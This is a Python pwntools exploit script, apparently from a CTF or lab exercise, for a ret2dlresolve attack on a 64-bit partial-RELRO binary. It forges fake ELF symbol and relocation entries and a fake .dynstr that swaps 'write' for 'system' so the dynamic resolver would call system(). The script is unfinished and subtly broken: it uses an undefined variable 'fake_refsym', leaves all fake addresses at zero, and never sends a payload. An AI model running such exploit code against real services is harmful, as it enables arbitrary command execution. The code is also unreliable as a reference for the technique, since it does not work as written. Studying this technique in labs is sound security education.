from pwn import *

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = args.FNAME if (args.FNAME) else "./main_parital_relro_64"
g_elf = ELF(g_fname)
context.binary = g_elf

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def get_shaddr(elfobj, sec_name):
	return elfobj.get_section_by_name(sec_name)["sh_addr"]

def pwn():
	bss_addr = g_elf.bss()
	new_stk = 0
	data_addr = 0
	fake_dynstr_addr = 0
	fake_reloc_addr = 0
	fake_refsym_addr = 0

	dynstr_shaddr = get_shaddr(g_elf, ".dynstr")
	dynsym_shaddr = get_shaddr(g_elf, ".dynsym")
	relplt_shaddr = get_shaddr(g_elf, ".rela.plt")
	log.debug(".dynstr@%#x\n.dynsym@%#x\n.rela.plt@%#x\n"
		, dynstr_shaddr
		, dynsym_shaddr
		, relplt_shaddr
	)
	
	fake_dynstr_off = fake_dynstr_addr - dynstr_shaddr
	fake_refsym_off = fake_refsym - dynsym_shaddr
	fake_reloc_off = fake_reloc_addr - relplt_shaddr
	
	# forge fake Elf64_Sym object
	# typedef struct
	# {
	#	Elf64_Word st_name;		/*Symbol name(string tbl index)*/
	#	unsigned char st_info;  	/*Symbol type and binding*/
	#	unsigned char st_other;	/*Symbol visibility*/
	#	Elf64_Section st_shndx;	/*Section index*/
	#	Elf64_Addr st_value;  	/*Symbol value*/
	#	Elf64_Xword st_size;  	/*Symbol size*/
	# }	Elf64_Sym;
	# sizeof(Elf64_Sym) == 24
	st_name = fake_dynstr_off
	st_info = 0x12
	st_other = 0
	st_shndx = 0 # SHN_UNDEF, undefined symbol, symbol refered in current module but defined in another.
	st_value = 0
	st_size = 0
	fake_symobj = flat([
		st_name | (st_info << 32) | (st_other << 40) | (st_shndx << 48),
		st_value,
		st_size
	])	


	# forge fake Elf64_Rela object
	fake_symidx = fake_refsym_off // len(fake_symobj)
	r_offset = 0x601018
	r_info = (fake_symidx << 32) | 0x7
	fake_reloc_obj = flat(r_offset, r_info, 0)

	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
	log.debug("fake_dynstr:\n\tlength=%d\n\tcontents=%s\n", len(fake_dynstr), fake_dynstr)
	

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
